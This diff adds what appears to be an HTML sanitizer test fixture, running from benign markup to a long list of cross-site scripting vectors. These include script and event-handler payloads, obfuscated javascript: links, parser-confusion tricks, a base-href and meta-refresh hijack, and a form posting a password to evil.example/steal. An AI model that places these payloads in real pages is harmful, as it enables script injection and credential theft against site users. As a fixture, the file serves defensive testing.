@@ -1,0 +1,38 @@
+<h2>Baseline</h2>
+<p style="color: red; text-align: center">Normal <b>bold</b> <em>em</em> <a href="https://example.com/?a=1&b=2" title="t">link</a> &amp; &nbsp; entity <span class="note" data-id="7">custom attr</span></p>
+<ul><li>one</li><li>two</li></ul>
+<table border="1"><tr><th scope="col">h</th></tr><tr><td>cell</td></tr></table>
+<img src="/images/a.jpg" alt="local"> <img src="https://example.com/track.gif" alt="external">
+<pre class="language-php"><code>&lt;?php echo 1; ?&gt;</code></pre>
+<h2>HTML5 tags</h2>
+<section><figure><img src="/images/b.jpg" alt="b"><figcaption>caption</figcaption></figure></section>
+<video controls src="/media/x.mp4"></video>
+<my-widget data-x="1">custom element</my-widget>
+<h2>Embeds and forms</h2>
+<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" width="560" height="315"></iframe>
+<iframe src="https://evil.example/frame.html"></iframe>
+<form action="https://evil.example/steal" method="post"><input name="pw" type="password"><button formaction="https://evil.example/x">go</button></form>
+<h2>Styles</h2>
+<style>.x { color: blue; background: url(https://evil.example/leak.png); }</style>
+<p style="background-image: url(https://evil.example/leak2.png); position: fixed; top: 0">styled</p>
+<h2>Scripts</h2>
+<script>alert('script tag')</script>
+<script src="https://evil.example/x.js"></script>
+<p onclick="alert('onclick')">onclick</p>
+<img src="x" onerror="alert('onerror')">
+<a href="javascript:alert('href')">javascript href</a>
+<a href="javascript&colon;alert('entity href')">entity href</a>
+<a href="jav&#x09;ascript:alert('tab href')">tab href</a>
+<a href="data:text/html,<script>alert(1)</script>">data href</a>
+<a href="https://ok.example" onmouseover="alert('mouseover')">mouseover</a>
+<svg onload="alert('svg')"><circle r="1"></circle></svg>
+<math><mi xlink:href="javascript:alert('math')">m</mi></math>
+<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x.swf">
+<template><img src="x" onerror="alert('template')"></template>
+<noscript><p title="</noscript><img src=x onerror=alert('noscript')>">n</p></noscript>
+<!-- comment --!><img src="x" onerror="alert('comment')"> -->
+<meta http-equiv="refresh" content="0;url=https://evil.example"><base href="https://evil.example/">
+<iframe srcdoc="<script>alert('srcdoc')</script>"></iframe>
+<p ONCLICK="alert('upper')" onClick="alert('mixed')">case</p>
+<p/onclick="alert('slash')">slash</p>
+<a href="  javascript:alert('spaces')">leading spaces</a>
